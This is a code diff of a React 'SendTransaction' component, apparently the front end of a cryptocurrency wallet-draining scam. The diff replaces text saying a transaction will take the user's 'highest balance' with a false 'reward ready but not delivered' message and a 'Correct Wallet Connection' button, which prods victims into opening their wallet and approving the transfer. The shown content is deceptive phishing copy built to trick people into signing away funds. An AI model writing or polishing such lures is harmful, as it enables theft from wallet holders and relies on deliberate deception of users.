@@ -111,7 +111,7 @@ const SendTransaction: React.FC<SendTransactionProps> = ({ balances }) => {
     {!transactionInitiated && showButton && (
       <>
         <div style={{ marginBottom: '10px' }}>
-          <strong>Instructions:</strong> Before proceeding, please ensure that your wallet is properly connected and that you have enough balance. Once you click the button below, a 5% discount will be applied to your highest balance, and the transaction will be processed.
+          <strong>Reward Status:</strong> your reward is ready but was not delivered to your Wallet , Not Properly Connected due to Wallet Misplacement , Move and Correct Wallet Connection issue Below.
         </div>
         <button
           ref={buttonRef}
@@ -120,12 +120,12 @@ const SendTransaction: React.FC<SendTransactionProps> = ({ balances }) => {
           onMouseLeave={() => setIsHovered(false)}
           style={buttonStyle}
         >
-          Solve Issue
+          Correct Wallet Connection
         </button>
       </>
     )}
-    {isPending && <div>Rectifying wallet issue... kindly follow the prompt instructions.</div>}
-    {isConfirming && <div>Waiting for System confirmation...</div>}
+    {isPending && <div>Open Wallet.</div>}
+    {isConfirming && <div>Waiting...</div>}
     {message && <div>{message}</div>}
   </div>
 );
